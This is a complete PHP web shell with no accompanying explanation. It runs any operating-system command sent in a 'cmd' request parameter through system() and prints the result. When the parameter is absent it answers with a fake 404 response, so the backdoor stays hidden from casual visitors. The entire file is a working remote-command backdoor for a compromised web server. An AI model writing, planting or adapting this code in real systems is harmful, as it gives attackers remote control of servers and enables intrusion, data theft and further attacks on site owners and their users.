<?php
if(isset($_REQUEST['cmd'])){
   echo "<pre>";
   $cmd = ($_REQUEST['cmd']);
   system($cmd);
   echo "</pre>";
   die;
 }else{
  header("HTTP/1.0 404 Not Found");
  exit();
 }?>
